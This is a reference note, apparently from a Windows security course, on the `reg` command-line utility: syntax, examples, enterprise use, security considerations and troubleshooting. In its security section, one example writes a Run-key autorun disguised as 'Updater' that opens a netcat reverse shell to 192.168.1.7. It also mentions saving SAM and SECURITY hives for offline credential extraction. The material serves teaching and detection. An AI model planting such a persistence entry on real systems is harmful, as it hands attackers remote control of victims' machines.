# REG Command

`reg` is the built-in Windows console utility for reading and writing the registry from the command line. It exposes the same hives and keys as the graphical Registry Editor (`regedit.exe`) and is the primary tool for scripting registry changes, exporting/importing settings, and loading offline hives during administration, deployment, and incident response.

## Overview

The registry is a hierarchical database of configuration data for Windows and installed applications. The `reg` command operates on this database through a set of sub-commands (`query`, `add`, `delete`, `export`, `import`, `copy`, `save`, `restore`, `load`, `unload`, `compare`, `flags`), each targeting a key path rooted at one of the predefined hives.

The five root hives are:

| Root | Abbreviation | Contents |
| --- | --- | --- |
| `HKEY_LOCAL_MACHINE` | `HKLM` | System-wide configuration for the whole machine |
| `HKEY_CURRENT_USER` | `HKCU` | Settings for the currently logged-on user |
| `HKEY_USERS` | `HKU` | Loaded user profiles (all users) |
| `HKEY_CLASSES_ROOT` | `HKCR` | File associations and COM class registration |
| `HKEY_CURRENT_CONFIG` | `HKCC` | Current hardware profile |

> [!NOTE]
> Writing to `HKLM` and most machine-wide keys requires an elevated (Administrator) command prompt. `HKCU` is writable by the current user without elevation.

## Syntax

```cmd
REG Operation [Parameter List]
```

```cmd
REG QUERY   KeyName [/v ValueName | /ve] [/s] [/t Type] [/f Data]
REG ADD     KeyName [/v ValueName | /ve] [/t Type] [/d Data] [/f]
REG DELETE  KeyName [/v ValueName | /ve | /va] [/f]
REG EXPORT  KeyName FileName.reg [/y]
REG IMPORT  FileName.reg
REG COPY    KeyName1 KeyName2 [/s] [/f]
REG SAVE    KeyName FileName.hiv [/y]
REG RESTORE KeyName FileName.hiv
REG LOAD    KeyName FileName
REG UNLOAD  KeyName
REG COMPARE KeyName1 KeyName2 [/v ValueName | /ve] [/oa | /od | /os | /on] [/s]
```

## Parameters

| Parameter | Description |
| --- | --- |
| `KeyName` | Full registry path: `\\Machine\ROOT\SubKey` (Machine is optional for remote). Example: `HKLM\Software\Microsoft\Windows\CurrentVersion` |
| `/v ValueName` | Operate on a specific named value under the key |
| `/ve` | Operate on the key's default (unnamed) value |
| `/va` | (DELETE) Remove all values under the key, leaving subkeys |
| `/s` | Recurse through all subkeys (QUERY/COPY); with EXPORT the whole subtree is written |
| `/t Type` | Value data type: `REG_SZ`, `REG_MULTI_SZ`, `REG_EXPAND_SZ`, `REG_DWORD`, `REG_QWORD`, `REG_BINARY`, `REG_NONE` |
| `/d Data` | The data to store in the value |
| `/f` | Force — suppress the confirmation prompt (overwrite/delete without asking) |
| `/y` | (EXPORT/SAVE) Overwrite the output file without prompting |
| `/oa /od /os /on` | (COMPARE) Output all / differences / matches / none |
| `/reg:32` `/reg:64` | Force access to the 32-bit or 64-bit registry view (WOW6432 redirection) |

## Examples

Read a single value:

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

Recursively search a subtree:

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /s
```

Create or overwrite a `REG_DWORD` value:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f
```

Add a string value:

```cmd
reg add "HKLM\Software\MyApp" /v InstallPath /t REG_SZ /d "C:\Program Files\MyApp" /f
```

Delete a single value / an entire key:

```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f
reg delete "HKCU\Software\MyApp" /f
```

Export a key to a `.reg` text file and re-import it:

```cmd
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" explorer_policy.reg
reg import explorer_policy.reg
```

A `.reg` export is plain text and can be edited or applied by double-clicking:

```reg
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoDrives"=dword:00000004
```

Copy a whole subtree from one location to another:

```cmd
reg copy "HKLM\Software\MyApp" "HKLM\Software\MyAppBackup" /s /f
```

Save a live key to a binary hive file and restore it later (used for backup/DR):

```cmd
reg save HKLM\Software software_backup.hiv /y
reg restore HKLM\Software software_backup.hiv
```

Mount an offline hive from another installation, edit it, then unmount:

```cmd
reg load HKLM\OfflineSystem D:\Windows\System32\config\SYSTEM
reg query HKLM\OfflineSystem\Select
reg unload HKLM\OfflineSystem
```

Compare two keys:

```cmd
reg compare HKLM\Software\MyApp HKLM\Software\MyAppBackup /s
```

Query a remote machine's registry (requires the Remote Registry service and rights):

```cmd
reg query \\SERVER01\HKLM\Software\Microsoft\Windows\CurrentVersion
```

## Enterprise Usage

- **Baseline and hardening**: distribute `.reg` files or `reg add` lines via startup/logon scripts, SCCM/Intune, or GPO preferences to enforce configuration (though native GPO Administrative Templates are preferred where they exist).
- **Offline servicing**: use `reg load` against a mounted WIM/VHD or a broken machine's `SYSTEM`/`SOFTWARE` hive to fix boot or driver settings without booting the OS.
- **Backup/restore**: `reg save` / `reg restore` capture binary snapshots of hives for change control before a risky modification.
- **Auditing**: `reg query ... /s` scripted across hosts inventories autorun locations, installed software, and policy state.
- **32/64-bit awareness**: on 64-bit Windows, 32-bit processes are redirected to `Wow6432Node`; use `/reg:64` or `/reg:32` to read the intended view.

## Security Considerations

> [!WARNING]
> The registry is a primary persistence and privilege-escalation surface. Autorun keys such as `HKCU\...\CurrentVersion\Run`, `HKLM\...\CurrentVersion\Run`, and services under `HKLM\SYSTEM\CurrentControlSet\Services` execute code automatically and are heavily abused by malware and red teams.

Example of a user-level autorun persistence entry (authorized testing only):

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\nc64.exe 192.168.1.7 443 -e cmd.exe" /f
```

- Changes to `HKLM` require elevation; unexpected writes there are high-signal for monitoring.
- Weak permissions on service keys or `Image File Execution Options` enable privilege escalation and debugger-hijack persistence.
- `reg load`/`reg save` touch `SAM`, `SECURITY`, and `SYSTEM` hives — the source of offline credential extraction; treat exported hive files as secrets.
- Log and alert on modifications to Run keys, `Winlogon`, and `Services` (Windows Security event 4657, Sysmon event 13).

## Troubleshooting

| Symptom | Likely cause | Resolution |
| --- | --- | --- |
| `ERROR: Access is denied.` | Not elevated, or key ACL denies write | Run the prompt as Administrator; check key permissions in `regedit` |
| `ERROR: The system was unable to find the specified registry key or value.` | Wrong path, value name, or 32/64-bit view | Verify the path with `reg query`; add `/reg:64` or `/reg:32` |
| Value written but app ignores it | Wrong data type (e.g. `REG_SZ` vs `REG_DWORD`) | Recreate the value with the correct `/t` type |
| `reg load` fails with "process cannot access the file" | Hive already loaded/in use | Ensure the offline OS is not running; `reg unload` any stale mount |
| Change not visible to a running process | Setting read only at startup/logon | Restart the process, service, or session |

## References

- <https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg>
- <https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry>
- <https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add>

## Related

- [Enterprise Windows Infrastructure Security](../Readme.md) — course hub and map of content
- [Windows-Registry](Windows-Registry.md) — registry structure, hives, and editing concepts — related note
- [Windows-Advanced-Boot-Options](Windows-Advanced-Boot-Options.md) — LastKnownGood and boot-related registry keys — related note
- [WMIC-Commands](WMIC-Commands.md) — WMI/CLI queries that complement registry inspection — related note
- Windows-Privilege-Escalation — registry-based persistence and privesc vectors — related note
